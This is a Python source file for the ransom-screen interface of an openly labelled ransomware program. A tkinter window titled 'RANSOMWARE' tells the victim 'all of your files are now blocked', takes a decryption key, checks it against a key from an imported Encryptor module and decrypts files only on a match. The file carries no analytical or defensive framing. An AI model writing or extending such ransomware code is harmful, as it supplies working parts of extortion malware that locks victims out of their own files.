from tkinter.messagebox import *
from tkinter.font import *
from encryption import Encryptor
import tkinter, time

class Ui:
    def __init__(self, typeOfEncryption):
        self.typeOfEncryption =  typeOfEncryption

        self.window = tkinter.Tk()
        self.window.geometry("800x500")
        self.window.title('RANSOMWARE')

        self.bg_color = "#E50808"
        self.window.config(background=self.bg_color)

        self.largeFont = Font(family="Consolas", size=24)
        self.mediumFont = Font(family="Consolas", size=18)
        self.lilFont = Font(family="Consolas", size=12)

        self.Render_elements()
        self.window.mainloop()

    
    def Render_elements(self):
        FilesBlockedLABEL = tkinter.Label(self.window, text="oh, all of your files are now blocked.", bg=self.bg_color, font=self.largeFont)
        EnterDecryptKeyLABEL = tkinter.Label(self.window, text="Enter the decrypt key", bg=self.bg_color, font=self.lilFont)
        self.userKeyENTRY = tkinter.Entry(self.window, width=30)
        submitUserENTRY = tkinter.Button(self.window, text="submit", command=self.SubmitUserInput)
        
        FilesBlockedLABEL.pack(pady=35)
        EnterDecryptKeyLABEL.pack()
        self.userKeyENTRY.pack(padx=25, pady=10)
        submitUserENTRY.pack()
        

    def SubmitUserInput(self):
        user_input = self.userKeyENTRY.get()
        encryptor = Encryptor(self.typeOfEncryption)
        key = encryptor.GetKey().decode()

        if user_input == key:
            label = tkinter.Label(self.window, text="Decrypting files...")
            label.pack()
            encryptor.FileDecryption()
            label.destroy()
            
            showinfo("info", "Files recovered.")
        else:
            label = tkinter.Label(self.window, text="Incorrect key")
            label.pack()